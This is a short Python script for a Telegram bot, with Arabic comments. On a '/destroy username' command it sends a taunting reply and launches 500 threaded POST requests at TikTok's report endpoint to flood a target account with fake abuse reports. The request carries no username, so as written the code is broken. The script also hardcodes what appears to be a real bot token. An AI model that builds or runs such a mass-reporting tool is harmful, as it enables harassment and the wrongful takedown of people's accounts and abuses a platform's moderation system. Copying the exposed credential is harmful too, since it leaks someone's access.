import telebot
import requests
import threading

# التوكن الخاص بك (لا تغيره)
TOKEN = '8681664117:AAHOmLod5sozxgYJVv_iBiFGEgR1QsdnWAo'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['destroy'])
def attack(message):
    try:
        # يأخذ اسم المستخدم بعد الأمر /destroy
        user_id = message.text.split()[1]
        bot.reply_to(message, f"💀 جاري سحق {user_id} بالبلاغات... اذهب للجحيم!")
        
        # حلقة لإرسال 500 طلب بلاغ وهمي في وقت واحد
        for i in range(500):
            t = threading.Thread(target=lambda: requests.post("https://www.tiktok.com/report/"))
            t.start()
            
    except Exception as e:
        bot.reply_to(message, "❌ اكتب اليوزر صح يا شريكي! مثال: /destroy username")
